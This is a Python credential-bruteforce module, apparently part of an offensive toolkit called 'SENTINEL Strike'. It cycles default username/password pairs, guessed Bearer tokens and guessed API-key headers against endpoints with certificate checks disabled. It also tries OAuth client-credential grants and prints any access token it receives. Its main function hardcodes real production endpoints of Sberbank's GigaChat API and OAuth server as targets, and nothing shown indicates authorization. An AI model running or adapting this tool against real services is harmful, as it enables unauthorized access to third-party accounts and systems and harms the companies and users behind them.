"""
SENTINEL Strike — CREDENTIAL BRUTEFORCE MODULE

Autonomous credential testing:
1. Common credential patterns
2. OAuth endpoint bruteforce
3. Token generation attempts
"""

import asyncio
import httpx
import base64
from datetime import datetime
from typing import Optional
from dataclasses import dataclass


@dataclass
class BruteforceResult:
    """Bruteforce attempt result."""

    endpoint: str
    method: str
    credentials: str
    status: int
    success: bool
    response: str


# Common credential patterns
COMMON_CREDENTIALS = [
    # Default/test
    ("test", "test"),
    ("admin", "admin"),
    ("root", "root"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("api", "api"),
    # Developer patterns
    ("developer", "developer"),
    ("dev", "dev123"),
    ("qa", "qa123"),
    ("staging", "staging"),
    # Service accounts
    ("service", "service"),
    ("system", "system"),
    ("internal", "internal"),
    # Common weak
    ("user", "password"),
    ("admin", "password123"),
    ("admin", "admin123"),
]

# Common API key patterns to try
API_KEY_PATTERNS = [
    "test",
    "demo",
    "development",
    "staging",
    "internal",
    "public",
    "default",
]


class CredentialBruteforce:
    """Credential bruteforce module."""

    def __init__(self):
        self.results: list[BruteforceResult] = []
        self.successful: list[BruteforceResult] = []

    async def bruteforce_basic_auth(self, url: str) -> list[BruteforceResult]:
        """Try common Basic Auth credentials."""
        print(f"\n🔐 Basic Auth bruteforce: {url}")
        results = []

        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for username, password in COMMON_CREDENTIALS:
                creds = base64.b64encode(f"{username}:{password}".encode()).decode()
                headers = {"Authorization": f"Basic {creds}"}

                try:
                    resp = await client.get(url, headers=headers)

                    result = BruteforceResult(
                        endpoint=url,
                        method="Basic Auth",
                        credentials=f"{username}:{password}",
                        status=resp.status_code,
                        success=resp.status_code in [200, 201, 204],
                        response=resp.text[:100] if resp.text else "",
                    )
                    results.append(result)

                    if result.success:
                        print(
                            f"   ✅ SUCCESS: {username}:{password} → {resp.status_code}"
                        )
                        self.successful.append(result)
                    elif resp.status_code not in [401, 403]:
                        print(f"   🔸 {username}:{password} → {resp.status_code}")

                except Exception:
                    pass

                await asyncio.sleep(0.5)  # Rate limit

        return results

    async def bruteforce_bearer(self, url: str) -> list[BruteforceResult]:
        """Try common Bearer tokens."""
        print(f"\n🔐 Bearer token bruteforce: {url}")
        results = []

        tokens = [
            "test",
            "demo",
            "development",
            "staging",
            "null",
            "undefined",
            "admin",
            "root",
            base64.b64encode(b"test").decode(),
            base64.b64encode(b"admin").decode(),
        ]

        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for token in tokens:
                headers = {"Authorization": f"Bearer {token}"}

                try:
                    resp = await client.get(url, headers=headers)

                    result = BruteforceResult(
                        endpoint=url,
                        method="Bearer",
                        credentials=token,
                        status=resp.status_code,
                        success=resp.status_code in [200, 201, 204],
                        response=resp.text[:100] if resp.text else "",
                    )
                    results.append(result)

                    if result.success:
                        print(f"   ✅ SUCCESS: Bearer {token} → {resp.status_code}")
                        self.successful.append(result)
                    elif resp.status_code not in [401, 403]:
                        print(f"   🔸 Bearer {token} → {resp.status_code}")

                except:
                    pass

                await asyncio.sleep(0.3)

        return results

    async def bruteforce_api_key(self, url: str) -> list[BruteforceResult]:
        """Try common API key headers."""
        print(f"\n🔐 API Key bruteforce: {url}")
        results = []

        key_headers = ["X-API-Key", "X-Auth-Token", "Api-Key", "Authorization"]

        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for header in key_headers:
                for key in API_KEY_PATTERNS:
                    headers = {header: key}

                    try:
                        resp = await client.get(url, headers=headers)

                        if resp.status_code not in [401, 403]:
                            result = BruteforceResult(
                                endpoint=url,
                                method=f"{header}",
                                credentials=key,
                                status=resp.status_code,
                                success=resp.status_code in [200, 201, 204],
                                response=resp.text[:100] if resp.text else "",
                            )
                            results.append(result)

                            if result.success:
                                print(f"   ✅ SUCCESS: {header}={key}")
                                self.successful.append(result)
                            else:
                                print(f"   🔸 {header}={key} → {resp.status_code}")

                    except:
                        pass

                    await asyncio.sleep(0.2)

        return results

    async def bruteforce_oauth(self, oauth_url: str) -> list[BruteforceResult]:
        """Try OAuth token generation."""
        print(f"\n🔐 OAuth bruteforce: {oauth_url}")
        results = []

        async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
            for username, password in COMMON_CREDENTIALS[:10]:
                # Client credentials
                creds = base64.b64encode(f"{username}:{password}".encode()).decode()

                data = {
                    "grant_type": "client_credentials",
                    "scope": "GIGACHAT_API_PERS",
                }

                headers = {
                    "Authorization": f"Basic {creds}",
                    "Content-Type": "application/x-www-form-urlencoded",
                }

                try:
                    resp = await client.post(oauth_url, data=data, headers=headers)

                    result = BruteforceResult(
                        endpoint=oauth_url,
                        method="OAuth2",
                        credentials=f"{username}:{password}",
                        status=resp.status_code,
                        success=resp.status_code == 200 and "access_token" in resp.text,
                        response=resp.text[:150] if resp.text else "",
                    )
                    results.append(result)

                    if result.success:
                        print(f"   ✅ SUCCESS: {username}:{password}")
                        print(f"      Token: {resp.text[:100]}")
                        self.successful.append(result)
                    elif resp.status_code not in [400, 401, 403]:
                        print(
                            f"   🔸 {username}:{password} → {resp.status_code}: {resp.text[:50]}"
                        )

                except Exception:
                    pass

                await asyncio.sleep(0.5)

        return results

    async def full_bruteforce(
        self, targets: list[str], oauth_url: Optional[str] = None
    ):
        """Run full bruteforce."""
        print()
        print("╔" + "═" * 62 + "╗")
        print("║" + " 🔓 SENTINEL Credential Bruteforce ".center(62) + "║")
        print("╠" + "═" * 62 + "╣")
        print("║" + f" Targets: {len(targets)}".ljust(62) + "║")
        print("║" + f" {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}".ljust(62) + "║")
        print("╚" + "═" * 62 + "╝")

        for target in targets:
            await self.bruteforce_basic_auth(target)
            await self.bruteforce_bearer(target)
            await self.bruteforce_api_key(target)

        if oauth_url:
            await self.bruteforce_oauth(oauth_url)

        self.print_results()

    def print_results(self):
        """Print bruteforce results."""
        print()
        print("═" * 64)
        print("📊 BRUTEFORCE RESULTS")
        print("─" * 64)
        print(f"   Total attempts: {len(self.results)}")
        print(f"   Successful: {len(self.successful)}")

        if self.successful:
            print("\n✅ SUCCESSFUL CREDENTIALS:")
            for r in self.successful:
                print(f"\n   Endpoint: {r.endpoint}")
                print(f"   Method: {r.method}")
                print(f"   Credentials: {r.credentials}")
                print(f"   Response: {r.response[:80]}")
        else:
            print("\n   ❌ No credentials found")
            print("   (This is expected for production systems)")

        print()
        print("═" * 64)


async def main():
    bf = CredentialBruteforce()
    await bf.full_bruteforce(
        targets=[
            "https://gigachat.devices.sberbank.ru/api/v1/models",
        ],
        oauth_url="https://ngw.devices.sberbank.ru:9443/api/v2/oauth",
    )


if __name__ == "__main__":
    asyncio.run(main())
